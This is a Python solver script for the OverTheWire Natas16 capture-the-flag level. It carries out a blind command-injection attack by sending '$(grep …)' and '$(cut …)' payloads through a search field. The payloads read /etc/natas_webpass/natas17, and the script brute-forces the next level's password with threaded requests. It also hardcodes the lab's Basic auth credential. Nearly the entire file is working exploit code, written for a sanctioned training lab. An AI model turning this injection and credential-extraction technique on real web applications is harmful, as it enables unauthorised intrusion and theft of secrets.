#!/usr/bin/env python3
import requests as req
from requests.auth import HTTPBasicAuth
import re
import sys
from colorama import Fore, Back
import concurrent.futures
import multiprocessing
import time
import random
inputs = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890"
list = [element for element in inputs]
password = ''
headers = {
    "Authorization": "Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA=="
}
url = "http://natas16.natas.labs.overthewire.org/index.php"


def build_schema(inp):
    schema = ['3', '5', '7', '8', '9', '0']
    payload = f"^a$(cut -b {inp+1} /etc/natas_webpass/natas17)"
    params = {
        "needle": payload,
        "submit": "Search"
    }
    pattern = re.compile(r"<pre>[\s\S]*</pre>")
    pattern2 = re.compile(r"\n\w(\w)")
    response = make_request({"params": params})
    f1 = pattern.findall(response["res"].text)
    f2 = pattern2.findall(f1[0])
    if(len(f2) > 0):
        schema = f2[0]
        return [schema, chr(ord(schema) - 32)]
    return schema


def make_request(inp):
    global headers
    global url
    # data = inp["data"]
    params = inp["params"]
    try:
        res = req.get(url, params=params, headers=headers,
                      timeout=5)
    except req.exceptions.Timeout:
        print(Fore.LIGHTRED_EX +
              "\n[!] Timeout, Continueing again" + Fore.WHITE)
        res = req.get(url, params=params, headers=headers,
                      timeout=5)
    return {"res": res, "params": inp["params"]}


def match_letter(char):
    payload = f"^Africans$(grep {char} /etc/natas_webpass/natas17)"
    params = {
        "needle": payload,
        "submit": "Search"
    }
    response = make_request({"params": params})
    pattern = re.compile(r'Africans', re.IGNORECASE)
    found = pattern.findall(response["res"].text)
    # print(found)
    if(len(found) < 1):
        return char


def brute_force(combination_schema):
    executor_list = []
    pattern = re.compile(r"Africans")
    for a in combination_schema[0]:
        for b in combination_schema[1]:
            for c in combination_schema[2]:
                for d in combination_schema[3]:
                    combination = a + b + c + d
                    payload = f"^Africans$(grep {combination} /etc/natas_webpass/natas17)"
                    yoyo = [" "*bal for bal in range(100)]
                    sys.stdout.write(Back.WHITE + Fore.BLACK +
                                     payload + Fore.WHITE + "\r")
                    # sys.stdout.write(
                    #     Fore.WHITE + yoyo[random.randint(0, 100)] + Fore.RESET+"\r")
                    sys.stdout.flush()
                    # print(payload)
                    params = {
                        "needle": payload,
                        "submit": "Search"
                    }
                    with concurrent.futures.ThreadPoolExecutor() as executor:
                        res = executor.submit(make_request, {"params": params})
                        executor_list.append(res)
    for result in executor_list:
        res = result.result()
        if (len(pattern.findall(res["res"].text)) < 1):
            pattern2 = re.compile(r"grep\s(\w*)\s")
            passwd = pattern2.findall(res["params"]["needle"])
            return passwd[0]


t1 = time.perf_counter()
print(Fore.LIGHTGREEN_EX + "[*] Enumerating Numbers...")
brute_list = ""
charlist = ""
nums = [str(num) for num in range(10)]
with concurrent.futures.ThreadPoolExecutor() as executor:
    results = executor.map(match_letter, nums)
for result in results:
    if(result != None):
        brute_list += result

print("[*] Numbers used in the password are : " + brute_list)
iterate = [i for i in range(32)]
schema = []
print("[*] Detecting character positions....")
with concurrent.futures.ThreadPoolExecutor() as executor:
    res = executor.map(build_schema, iterate)
    for rex in res:
        schema.append(rex)
print("[*] Built Schema :\n" + str(schema))
exec = []
brute_result = ""
lol = schema[0:4]
print(Back.RED+Fore.WHITE +
      "[*] Starting to brute force... Could take about 140 Seconds.."+Back.RESET)
with concurrent.futures.ProcessPoolExecutor() as executor:
    for x in range(0, 32, 4):
        exec.append(executor.submit(brute_force, schema[0+x:4+x]))
    for pp in exec:
        brute_result += pp.result()
t2 = time.perf_counter()
print(Back.RESET + Fore.LIGHTBLUE_EX + "\n[!] Password: " + brute_result)
print(Back.GREEN + "[#] Took "+t2-t1+" seconds to complete")
